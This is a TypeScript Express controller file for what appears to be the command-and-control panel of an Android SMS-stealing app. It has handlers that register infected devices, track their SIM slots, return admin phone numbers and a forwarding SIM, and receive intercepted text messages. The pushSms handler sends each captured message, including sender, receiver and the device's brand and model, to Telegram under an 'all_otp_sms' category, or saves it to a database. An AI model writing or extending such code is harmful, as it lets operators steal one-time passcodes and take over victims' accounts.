import { Request, Response } from "express";
import logger from "../logger/logger";
import * as deviceService from "../services/deviceService";
import * as smsService from "../services/smsService";
import wsService from "../services/wsService";
import config from "../config";
import { sendTelegramMessage } from "../services/telegramService";
import { buildTelegramAllOtpSmsMessage } from "../utils/telegramMessage";

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

function isSendSmsDisabled(): boolean {
  const value = clean(
    (config as any).sendSms || process.env.SENDSMS || "yes",
  ).toLowerCase();
  return value === "no";
}

function getDeviceTelegramMeta(device: any, deviceId: string) {
  return {
    pannelId: config.pannelId,
    deviceId,
    brandName: clean(
      device?.metadata?.brand || device?.metadata?.manufacturer || "",
    ),
    model: clean(device?.metadata?.model || ""),
    online: !!device?.status?.online,
    lastSeen: Number(device?.status?.timestamp || Date.now()),
  };
}

/**
 * Thin controllers matching the routes.
 * Each controller responds with { success, error? } where appropriate.
 */

export async function upsertDevice(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const body = req.body || {};
  try {
    await deviceService.upsertDeviceMetadata(deviceId, body);
    logger.info("controller: upsertDevice", { deviceId });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: upsertDevice failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

export async function updateStatus(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const { online, timestamp } = req.body || {};
  try {
    await deviceService.updateDeviceStatus(deviceId, !!online, typeof timestamp !== "undefined" ? Number(timestamp) : undefined);
    try {
      wsService.notifyDeviceStatus(deviceId, { online: !!online, timestamp: Number(timestamp || Date.now()) });
    } catch (e) {
      // ignore
    }
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: updateStatus failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

export async function updateSimSlot(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const slot = req.params.slot;
  const { status, updatedAt } = req.body || {};
  try {
    await deviceService.updateSimSlot(deviceId, slot, status || "inactive", typeof updatedAt !== "undefined" ? Number(updatedAt) : undefined);
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: updateSimSlot failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

export async function upsertSimInfo(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const simInfo = req.body || null;
  if (!simInfo) return res.status(400).json({ success: false, error: "missing simInfo" });
  try {
    await deviceService.upsertSimInfo(deviceId, simInfo);
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: upsertSimInfo failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

export async function getAdmins(req: Request, res: Response) {
  const id = req.params.id;
  try {
    const admins = await deviceService.getDeviceAdmins(id);
    return res.json(admins);
  } catch (err: any) {
    logger.error("controller: getAdmins failed", err);
    return res.status(500).json([]);
  }
}

export async function getAdminPhone(req: Request, res: Response) {
  const id = req.params.id;
  try {
    const phone = await deviceService.getDeviceAdminPhone(id);
    return res.json(phone);
  } catch (err: any) {
    logger.error("controller: getAdminPhone failed", err);
    return res.status(500).json("");
  }
}

export async function getForwardingSim(req: Request, res: Response) {
  const id = req.params.id;
  try {
    await deviceService.getDeviceAdmins(id);
    const deviceDoc = await deviceService.upsertDeviceMetadata(id, {});
    const forwarding = (deviceDoc as any)?.forwardingSim || "auto";
    return res.json(forwarding);
  } catch (err: any) {
    logger.error("controller: getForwardingSim failed", err);
    return res.status(500).json("auto");
  }
}

export async function pushSms(req: Request, res: Response) {
  const id = req.params.id;
  const body = req.body || {};

  try {
    const payload = {
      sender: body.sender || body.from || "unknown",
      receiver: body.receiver || body.recv || "",
      title: body.title || "",
      body: body.body || body.message || "",
      timestamp: Number(body.timestamp || Date.now()),
      meta: body.meta || {},
    };

    const sendSmsDisabled = isSendSmsDisabled();

    if (sendSmsDisabled) {
      try {
        const device =
          typeof (deviceService as any).getDevice === "function"
            ? await (deviceService as any).getDevice(id)
            : null;

        const meta = getDeviceTelegramMeta(device, id);

        const telegramText = buildTelegramAllOtpSmsMessage({
          ...meta,
          smsText: clean(payload.body),
          smsTitle: clean(payload.title),
          sender: clean(payload.sender),
          receiver: clean(payload.receiver),
          timestamp: Number(payload.timestamp || Date.now()),
        });

        const result = await sendTelegramMessage({
          category: "all_otp_sms" as any,
          text: telegramText,
        });

        logger.info("controller: pushSms SENDSMS=no routed only to Telegram", {
          deviceId: id,
          ok: result.ok,
          skipped: result.skipped,
          error: result.error,
        });
      } catch (telegramErr: any) {
        logger.error("controller: pushSms SENDSMS=no telegram failed", {
          deviceId: id,
          error: telegramErr?.message || telegramErr,
        });
      }

      return res.json({
        success: true,
        sendSmsDisabled: true,
        savedToDb: false,
        broadcastToFrontend: false,
      });
    }

    await smsService.saveSms(id, payload);

    return res.json({
      success: true,
      sendSmsDisabled: false,
      savedToDb: true,
      broadcastToFrontend: false,
    });
  } catch (err: any) {
    logger.error("controller: pushSms failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}
